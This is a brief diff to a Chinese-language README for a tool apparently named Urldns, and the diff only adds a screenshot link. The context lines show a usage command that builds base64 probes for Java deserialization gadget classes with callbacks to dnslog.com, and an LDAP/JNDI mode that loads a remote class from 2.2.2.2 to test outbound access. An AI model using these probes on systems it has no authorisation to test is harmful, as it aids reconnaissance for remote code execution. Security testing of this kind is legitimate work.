@@ -63,6 +63,7 @@ com.ibm.ws.webservices.engine.client.ServiceFactory
 
 示例: java -jar Urldns.jar base64 "CommonsBeanutils2|C3P0|ognl.OgnlContext" dnslog.com
 效果如下图
+![图片](https://github.com/kezibei/Urldns/assets/83849145/5ee4ceb6-02d5-472e-8867-01c20a2c7049)
 
 
 ldap模式支持ldap://2.2.2.2:1389/jndi，将不再反序列化而是远程加载class，以探测是否出网
